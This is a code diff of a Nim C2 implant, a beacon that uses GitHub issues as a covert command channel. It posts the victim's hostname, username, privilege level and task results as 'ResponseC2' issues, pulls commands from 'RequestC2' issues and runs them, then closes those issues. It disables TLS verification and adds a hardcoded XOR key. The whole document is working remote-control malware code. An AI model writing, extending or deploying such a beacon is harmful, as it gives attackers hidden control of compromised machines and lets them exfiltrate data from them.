@@ -1,7 +1,6 @@
 import std/net
 import httpclient
 import json
-import std/base64
 import uri
 import std/strutils
 
@@ -19,38 +18,19 @@ proc initBeaconGithub*(self: BeaconGithub, project, token: string) =
     self.sleepTimeMs = 10000
     self.project = project
     self.token = "token " & token
+    self.xorKey = "dfsdgferhzdzxczevre5595485sdg"
 
 
 proc checkIn*(self: BeaconGithub) = 
     let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
 
     try:
-        # data to send
-        var sessions = newJArray()
-        for it in self.taskResults:
-            sessions.add(it)
-
-        var nbTaskResults = len(self.taskResults)
-        for i in 0..nbTaskResults-1:
-            var tmp = self.taskResults.pop()
-
-        var boundel = %*{"arch": self.arch, "beaconHash": self.beaconHash, 
-                        "hostname": self.hostname , "listenerHash": "", "os": self.os, 
-                        "privilege": self.privilege, "sessions": "", "username": self.username, "lastProofOfLife":"0"}
-
-        boundel["sessions"]=sessions
-
-        var multiBoundel = newJArray()
-        multiBoundel.add(boundel)
-
-        var key="dfsdgferhzdzxczevre5595485sdg";
-        var datab64 = xorEncode(key, $multiBoundel)
-        var bodyToPost = encode(datab64)
+        let bodyToPost = self.taskResultsToCmd()
 
         # Send results
         var postData = %* {"title": "ResponseC2: " & self.beaconHash, "body": bodyToPost}
         client.headers = newHttpHeaders({ "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" })
-        let res = client.request("https://api.github.com/repos/" & self.project & "/issues", httpMethod = HttpPost, body = $postData)
+        discard client.request("https://api.github.com/repos/" & self.project & "/issues", httpMethod = HttpPost, body = $postData)
 
         echo "[+] send results "
         # echo "https://api.github.com/repos/" & self.project & "/issues"
@@ -71,18 +51,13 @@ proc checkIn*(self: BeaconGithub) =
             var number = b1["number"].getInt()
 
             if "RequestC2: " in title and self.beaconHash in title:
-                var bodyb64d = decode($body)
-                var bodyb64dd = xorEncode(key, bodyb64d)
-                var cmdToProcess: string
-                cmdToProcess = toString(bodyb64dd)
-
-                echo "[+] process issue ", cmdToProcess
-
-                self.cmdToTasks(cmdToProcess)
+                let trimmedBody = body.strip()
+                if trimmedBody.len > 0:
+                    self.cmdToTasks(trimmedBody)
 
                 var postClose = %* {"state": "closed"}
                 client.headers = newHttpHeaders({ "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" })
-                let response = client.request("https://api.github.com/repos/" & self.project & "/issues/" & $number, httpMethod = HttpPost, body = $postClose)
+                discard client.request("https://api.github.com/repos/" & self.project & "/issues/" & $number, httpMethod = HttpPost, body = $postClose)
 
                 echo "[+] close issue ", $number
 
